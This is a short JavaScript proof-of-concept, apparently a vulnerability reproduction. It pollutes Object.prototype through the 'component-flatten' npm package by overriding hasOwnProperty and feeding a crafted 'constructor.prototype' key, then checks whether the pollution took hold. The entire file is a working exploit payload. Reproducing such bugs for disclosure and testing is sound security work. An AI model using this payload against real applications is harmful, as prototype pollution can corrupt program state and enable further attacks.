Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const cf = require('component-flatten');
let tree = {
    ref: 'polluted',
    name: 'constructor.prototype'
};
cf(tree);
if ({}.polluted != undefined) {
    console.log('yes');
} else {
    console.log(undefined);
}